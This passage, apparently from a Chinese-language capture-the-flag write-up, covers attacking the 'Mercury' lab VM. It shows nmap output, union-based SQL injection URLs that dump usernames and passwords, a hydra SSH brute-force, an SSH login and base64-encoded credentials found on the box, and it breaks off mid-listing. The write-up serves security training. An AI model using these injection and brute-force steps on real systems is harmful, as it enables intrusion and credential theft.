class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,8080 192.168.56.115        <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-15 07:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.115<br>Host is up (0.00040s latency).<br><br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)<br>|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)<br>|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)<br>8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Date: Thu, 15 Jun 2023 00:59:20 GMT<br>|     Server: WSGIServer/0.2 CPython/3.8.2<br>|     Content-Type: text/html<br>|     X-Frame-Options: DENY<br>|     Content-Length: 2366<br>|     X-Content-Type-Options: nosniff<br>|     Referrer-Policy: same-origin<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Page not found at /nice ports,/Trinity.txt.bak&lt;/title&gt;<br>|     &lt;meta name=<span class="hljs-string">&quot;robots&quot;</span> content=<span class="hljs-string">&quot;NONE,NOARCHIVE&quot;</span>&gt;<br>|     &lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>|     html * &#123; padding:0; margin:0; &#125;<br>|     body * &#123; padding:10px 20px; &#125;<br>|     body * * &#123; padding:0; &#125;<br>|     body &#123; font:small sans-serif; background:<span class="hljs-comment">#eee; color:#000; &#125;</span><br>|     body&gt;div &#123; border-bottom:1px solid <span class="hljs-comment">#ddd; &#125;</span><br>|     font-weight:normal; margin-bottom:.4em; &#125;<br>|     span &#123; font-size:60%; color:<span class="hljs-comment">#666; font-weight:normal; &#125;</span><br>|     table &#123; border:none; border-collapse: collapse; width:100%; &#125;<br>|     vertical-align:<br>|   GetRequest, HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Date: Thu, 15 Jun 2023 00:59:20 GMT<br>|     Server: WSGIServer/0.2 CPython/3.8.2<br>|     Content-Type: text/html; charset=utf-8<br>|     X-Frame-Options: DENY<br>|     Content-Length: 69<br>|     X-Content-Type-Options: nosniff<br>|     Referrer-Policy: same-origin<br>|     Hello. This site is currently <span class="hljs-keyword">in</span> development please check back later.<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="hljs-string">|_http-server-header: WSGIServer/0.2 CPython/3.8.2</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.92%I=7%D=6/15%Time=648AFD15%P=x86_64-pc-linux-gnu%r(Ge</span><br><span class="hljs-string">SF:tRequest,135,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2015\x20Jun\x202</span><br><span class="hljs-string">SF:023\x2000:59:20\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.2</span><br><span class="hljs-string">SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2</span><br><span class="hljs-string">SF:0DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff\r\</span><br><span class="hljs-string">SF:nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20is\x</span><br><span class="hljs-string">SF:20currently\x20in\x20development\x20please\x20check\x20back\x20later\.&quot;</span><br><span class="hljs-string">SF:)%r(HTTPOptions,135,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2015\x20J</span><br><span class="hljs-string">SF:un\x202023\x2000:59:20\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/</span><br><span class="hljs-string">SF:3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Opti</span><br><span class="hljs-string">SF:ons:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nos</span><br><span class="hljs-string">SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\</span><br><span class="hljs-string">SF:x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x20l</span><br><span class="hljs-string">SF:ater\.&quot;)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DT</span><br><span class="hljs-string">SF:D\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\</span><br><span class="hljs-string">SF:.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20cont</span><br><span class="hljs-string">SF:ent=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;titl</span><br><span class="hljs-string">SF:e&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="hljs-string">SF:body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20</span><br><span class="hljs-string">SF:\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20\(&#x27;</span>RTSP/<br>SF:1\.0<span class="hljs-string">&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20expl</span><br><span class="hljs-string">SF:anation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x2</span><br><span class="hljs-string">SF:0or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span><br><span class="hljs-string">SF:)%r(FourOhFourRequest,A28,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x2</span><br><span class="hljs-string">SF:0Thu,\x2015\x20Jun\x202023\x2000:59:20\x20GMT\r\nServer:\x20WSGIServer/</span><br><span class="hljs-string">SF:0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Option</span><br><span class="hljs-string">SF:s:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20nos</span><br><span class="hljs-string">SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;htm</span><br><span class="hljs-string">SF:l\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\x20\x20&lt;meta\x20http-equiv=\&quot;content-type\&quot;</span><br><span class="hljs-string">SF:\x20content=\&quot;text/html;\x20charset=utf-8\&quot;&gt;\n\x20\x20&lt;title&gt;Page\x20no</span><br><span class="hljs-string">SF:t\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak&lt;/title&gt;\n\x20\x20</span><br><span class="hljs-string">SF:&lt;meta\x20name=\&quot;robots\&quot;\x20content=\&quot;NONE,NOARCHIVE\&quot;&gt;\n\x20\x20&lt;style</span><br><span class="hljs-string">SF:\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20html\x20\*\x20&#123;\x20padding:0;\x</span><br><span class="hljs-string">SF:20margin:0;\x20&#125;\n\x20\x20\x20\x20body\x20\*\x20&#123;\x20padding:10px\x2020</span><br><span class="hljs-string">SF:px;\x20&#125;\n\x20\x20\x20\x20body\x20\*\x20\*\x20&#123;\x20padding:0;\x20&#125;\n\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20body\x20&#123;\x20font:small\x20sans-serif;\x20background:#eee;</span><br><span class="hljs-string">SF:\x20color:#000;\x20&#125;\n\x20\x20\x20\x20body&gt;div\x20&#123;\x20border-bottom:1p</span><br><span class="hljs-string">SF:x\x20solid\x20#ddd;\x20&#125;\n\x20\x20\x20\x20h1\x20&#123;\x20font-weight:normal</span><br><span class="hljs-string">SF:;\x20margin-bottom:\.4em;\x20&#125;\n\x20\x20\x20\x20h1\x20span\x20&#123;\x20font</span><br><span class="hljs-string">SF:-size:60%;\x20color:#666;\x20font-weight:normal;\x20&#125;\n\x20\x20\x20\x20</span><br><span class="hljs-string">SF:table\x20&#123;\x20border:none;\x20border-collapse:\x20collapse;\x20width:10</span><br><span class="hljs-string">SF:0%;\x20&#125;\n\x20\x20\x20\x20td,\x20th\x20&#123;\x20vertical-align:&quot;);</span><br><span class="hljs-string">MAC Address: 08:00:27:D5:99:58 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.6</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 94.90 seconds</span><br></code></pre></td></tr></table></figure><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>8080 端口下有个 robots.txt，点进去并没有发现有价值的信息。还探测到了 WSGIServer&#x2F;0.2 CPython&#x2F;3.8.2 搜了一下似乎某个采用这两个组件的系统存在漏洞。</p><p><img src="/pic/e9215d54b0cd5b980a83ebb27ec93f15_MD5.png"></p><p>尝试其中的路径，得到了错误返回，看来并不是这个系统，但是错误返回里包含了我们所想寻找的信息</p><p><img src="/pic/e83667242e122ac19a5f3d2c3dc4f0e2_MD5.png"></p><p>由于开发者开启了 DEBUG 模式，因此服务器返回了敏感信息，我们从中得到了我们需要的目录信息</p><p><img src="/pic/5156dfaaebb877705576bf6c47753cb9_MD5.png"></p><p>目录中有两个子链，分别指向 todo 和 1</p><p><img src="/pic/0279128c42f066ec361ec0f22735f845_MD5.png"></p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>todo 中给定了一些开发者在开发过程中留下的计划，我们可以得知两个事情：一是目前没有鉴权，二是目前是直接和 mysql 进行交互的。我们看看另一个链接，其中包含数字，可能存在 SQL 注入</p><p><img src="/pic/6fe0bf43c027783002641b84a82a70e6_MD5.png"></p><p>尝试单引号</p><p><img src="/pic/cbdd3c2cbe59a4a1af1e58e8b9fc0db0_MD5.png"></p><p>单引号报错，返回信息中确认了是 MySQL 数据库，似乎是数字型注入，不需要闭合，接下来尝试 union 联合注入，首先使用 order by</p><p><img src="/pic/748645592915b191f4f268c39705a522_MD5.png"></p><p>接下来使用联合查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/-1 union <span class="hljs-keyword">select</span> database()<br></code></pre></td></tr></table></figure><p><img src="/pic/1af6d2411def27c65331eae570c8e79d_MD5.png"></p><p>确认了数据库名，接下来查看数据库下的表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/1 union <span class="hljs-keyword">select</span> group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema = <span class="hljs-string">&#x27;mercury&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/pic/3b930fd2509f98fb14d7f2a6cce2190d_MD5.png"></p><p>表中的列名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/1 union <span class="hljs-keyword">select</span> group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/pic/3814771863a9914b919cef5a17530de0_MD5.png"></p><p>然后直接查询数据库即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.115:8080/mercuryfacts/2 union <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">id</span>,0x2d,password,0x2d,username) from <span class="hljs-built_in">users</span><br></code></pre></td></tr></table></figure><p><img src="/pic/9e40e78bf879928a3d86a5807cbce870_MD5.png"></p><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>收集用户名和密码，按行写入到文件中，在使用 awk 工具来将用户名和密码存入对应的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ <span class="hljs-built_in">cat</span> db                                <br>1-johnny1987-john<br>2-lovemykids111-laura<br>3-lovemybeer111-sam<br>4-mercuryisthesizeof0.056Earths-webmaster<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ <span class="hljs-built_in">cat</span> db | awk -F <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;&#123;print$2&#125;&#x27;</span> &gt; passwd    <br><br>┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ <span class="hljs-built_in">cat</span> db | awk -F <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;&#123;print$3&#125;&#x27;</span> &gt; user<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ hydra -L user -P passwd 192.168.56.115 ssh<br>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-15 08:36:33<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task<br>[DATA] attacking ssh://192.168.56.115:22/<br>[22][ssh] host: 192.168.56.115   login: webmaster   password: mercuryisthesizeof0.056Earths<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-15 08:36:38<br></code></pre></td></tr></table></figure><p>爆破得到用户名和密码，尝试 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ ssh webmaster@192.168.56.115    <br>webmaster@192.168.56.115\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Thu 15 Jun 01:37:12 UTC 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:  0.01              Processes:               106</span><br><span class="hljs-string">  Usage of /:   78.3% of 4.86GB   Users logged in:         0</span><br><span class="hljs-string">  Memory usage: 31%               IPv4 address for enp0s3: 192.168.56.115</span><br><span class="hljs-string">  Swap usage:   0%</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">22 updates can be installed immediately.</span><br><span class="hljs-string">0 of these updates are security updates.</span><br><span class="hljs-string">To see these additional updates run: apt list --upgradable</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Tue Sep  1 13:57:14 2020 from 192.168.31.136</span><br><span class="hljs-string">webmaster@mercury:~$ whoami</span><br><span class="hljs-string">webmaster</span><br><span class="hljs-string">webmaster@mercury:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:d5:99:58 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.115/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 497sec preferred_lft 497sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fed5:9958/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">webmaster@mercury:~$ uname -a</span><br><span class="hljs-string">Linux mercury 5.4.0-45-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">webmaster@mercury:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for webmaster: </span><br><span class="hljs-string">Sorry, user webmaster may not run sudo on mercury.</span><br><span class="hljs-string">webmaster@mercury:~$ ls</span><br><span class="hljs-string">mercury_proj  user_flag.txt</span><br><span class="hljs-string">webmaster@mercury:~$ cat user_flag.txt </span><br><span class="hljs-string">[user_flag_8339915c9a454657bd60ee58776f4ccd]</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~$ <span class="hljs-built_in">ls</span> -liah<br>total 36K<br> 35299 drwx------ 4 webmaster webmaster 4.0K Sep  2  2020 .<br>    18 drwxr-xr-x 5 root      root      4.0K Aug 28  2020 ..<br> 32650 lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null<br> 35301 -rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout<br> 35300 -rw-r--r-- 1 webmaster webmaster 3.7K Aug 27  2020 .bashrc<br>165881 drwx------ 2 webmaster webmaster 4.0K Aug 27  2020 .cache<br>162261 drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 mercury_proj<br> 35302 -rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile<br>    22 -rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor<br> 55367 -rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt<br>webmaster@mercury:~$ <span class="hljs-built_in">cd</span> mercury_proj/<br>webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">ls</span> -liah<br>total 28K<br>162261 drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 .<br> 35299 drwx------ 4 webmaster webmaster 4.0K Sep  2  2020 ..<br>165898 -rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3<br>165900 -rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.py<br>165882 drwxrwxr-x 6 webmaster webmaster 4.0K Sep  1  2020 mercury_facts<br>165766 drwxrwxr-x 4 webmaster webmaster 4.0K Aug 28  2020 mercury_index<br>165765 drwxrwxr-x 3 webmaster webmaster 4.0K Aug 28  2020 mercury_proj<br>166251 -rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txt<br><br></code></pre></td></tr></table></figure><p>进入到 mercury_proj 目录下看到有个 notes.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> manage.py <br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;Django&#x27;s command-line utility for administrative tasks.&quot;</span><span class="hljs-string">&quot;&quot;</span><br>import os<br>import sys<br><br>def main():<br>    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;Run administrative tasks.&quot;</span><span class="hljs-string">&quot;&quot;</span><br>    os.environ.setdefault(<span class="hljs-string">&#x27;DJANGO_SETTINGS_MODULE&#x27;</span>, <span class="hljs-string">&#x27;mercury_proj.settings&#x27;</span>)<br>    try:<br>        from django.core.management import execute_from_command_line<br>    except ImportError as exc:<br>        raise ImportError(<br>            <span class="hljs-string">&quot;Couldn&#x27;t import Django. Are you sure it&#x27;s installed and &quot;</span><br>            <span class="hljs-string">&quot;available on your PYTHONPATH environment variable? Did you &quot;</span><br>            <span class="hljs-string">&quot;forget to activate a virtual environment?&quot;</span><br>        ) from exc<br>    execute_from_command_line(sys.argv)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br>webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> notes.txt <br>Project accounts (both restricted):<br>webmaster <span class="hljs-keyword">for</span> web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK<br>linuxmaster <span class="hljs-keyword">for</span> linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==<br></code></pre></td></tr></table></figure><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>txt 文件中包含两个用户名和对应的密码（应该是密码），base64 解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 